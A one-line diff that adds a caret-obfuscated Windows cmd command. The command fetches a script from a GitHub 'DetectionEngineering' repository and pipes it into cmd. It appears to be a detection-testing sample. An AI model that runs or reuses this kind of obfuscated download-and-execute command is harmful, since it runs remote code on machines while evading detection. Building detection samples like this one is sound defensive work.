@@ -1,0 +1,1 @@
+cmd  /k "h^t^t^p^s^:^/^/^r^a^w^.^g^i^t^h^u^b^u^s^e^r^c^o^n^t^e^n^t^.^c^o^m^/^w^i^f^i^s^e^c^/^D^e^t^e^c^t^i^o^n^E^n^g^i^n^e^e^r^i^n^g^/^r^e^f^s^/^h^e^a^d^s^/^m^a^i^n^/^w^g^e^t^_^p^s^_^c^a^l^c | cmd && exit"
